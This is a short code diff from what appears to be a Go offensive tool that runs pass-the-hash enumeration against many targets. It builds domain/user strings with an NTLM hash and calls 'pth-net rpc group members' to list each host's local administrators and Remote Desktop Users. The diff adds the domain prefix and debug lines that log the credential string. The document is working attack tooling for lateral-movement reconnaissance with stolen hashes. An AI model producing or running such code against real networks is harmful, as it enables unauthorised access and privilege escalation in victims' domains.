@@ -36,7 +36,11 @@ func testTargetLA(ctx context.Context, target string) {
 
 	//userpass := "user2%Password123"
 	//userpass := "user2%aad3b435b51404eeaad3b435b51404ee:NTLM
-	userpass := fmt.Sprintf("%v%%aad3b435b51404eeaad3b435b51404ee:%v", username, ntlm)
+	//userpass := "domain\\user2%aad3b435b51404eeaad3b435b51404ee:NTLM
+
+
+	userpass := fmt.Sprintf("%v\\\\%v%%aad3b435b51404eeaad3b435b51404ee:%v", domain, username, ntlm)
+	logger.Log.Debug("--auth=> ",userpass)
 
 	cmdZ := exec.Command("pth-net", "rpc", "group", "members", "administrators", "-U", userpass, "-S", target)
 	outZ, errZ := cmdZ.CombinedOutput()
@@ -140,7 +144,9 @@ func makeEnumWorker2(ctx context.Context, targets <-chan string, wg *sync.WaitGr
 func testTargetRDP(ctx context.Context, target string) {
 	atomic.AddInt32(&counter, 1)
 
-	userpass := fmt.Sprintf("%v%%aad3b435b51404eeaad3b435b51404ee:%v", username, ntlm)
+	userpass := fmt.Sprintf("%v\\\\%v%%aad3b435b51404eeaad3b435b51404ee:%v", domain, username, ntlm)
+	logger.Log.Debug("--auth=> ",userpass)
+	//fmt.Print(userpass)
 
 	logger.Log.Debug("* testing host =>", target)
 	cmdZ := exec.Command("pth-net", "rpc", "group", "members", "Remote Desktop Users", "-U", userpass, "-S", target)
